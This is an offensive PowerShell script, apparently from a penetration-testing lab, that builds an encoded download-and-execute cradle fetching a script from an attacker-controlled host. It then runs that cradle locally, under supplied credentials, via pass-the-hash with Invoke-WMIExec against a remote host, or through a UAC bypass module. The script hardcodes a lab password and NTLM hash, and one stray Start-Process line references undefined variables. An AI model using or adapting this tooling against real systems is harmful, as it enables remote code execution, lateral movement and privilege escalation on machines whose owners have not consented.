# author: WatchDogOblivion
# description: TODO

param (
    [string]$LHost = "192.168.119.144",
    [string]$LPort = "445",
    [string]$File = "ipwsh.ps1",
    [string]$RHost = "10.5.5.25",

    [switch]$Authenticate = $false,
    [string]$Pass = "OffSecHax1!",
    [string]$Shell = "powershell",
    [switch]$NewProcess = $false,
    [string]$FilePath = "powershell",

    [switch]$WMIExec = $false,
    [string]$User = "newadmin",
    [string]$Hash = "b0bf81363146f9af0c636ef45d22b79d",

    [switch]$UAC = $false,
    [string]$Method = "oobe"
)
Start-Process -Credential $Credential -FilePath 'powershell' -ArgumentList '-encoded $Encoded'
function GetCommand {
    $Payload = "iex(new-object net.webclient).downloadstring(`"http://$LHost`:$LPort/$File`")"
    $Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($Payload))
    $PayloadArgument = "-encoded $Encoded"
    $Command = "$Shell -c `"$FilePath $PayloadArgument`""
    if ($NewProcess) {
        $CredentialArgument = ""
        if ($Authenticate) {
            $SecurePassword = ConvertTo-SecureString $Pass -AsPlainText -Force
            $Credential = New-Object System.Management.Automation.PSCredential $User, $SecurePassword
            $CredentialArgument = "-Credential $Credential"
        }
        $Command = "$Shell -c `"Start-Process $CredentialArgument -FilePath '$FilePath' -ArgumentList '$PayloadArgument'`""
    }
    return $Command
}

function ExecuteModules {

    param([string]$Command)

    try {
        if ($WMIExec) {
            Import-Module $PSScriptRoot\lib\pth\Invoke-WMIExec.ps1
            Invoke-WMIExec -Target $RHost -Domain xor -Username $User -Hash $Hash -Command "$Command"
        }
        elseif ($UAC) {
            Import-Module $PSScriptRoot\lib\other\Invoke-PsUACme.ps1
            Invoke-PsUACme -method $Method -Payload $Command
        }
        else {
            Invoke-Expression -Command $Command
            Write-Output $Command
        }
    }
    catch {
        Write-Host "An error occurred:"
        Write-Host $_
    }
}

$Command = GetCommand
ExecuteModules $Command
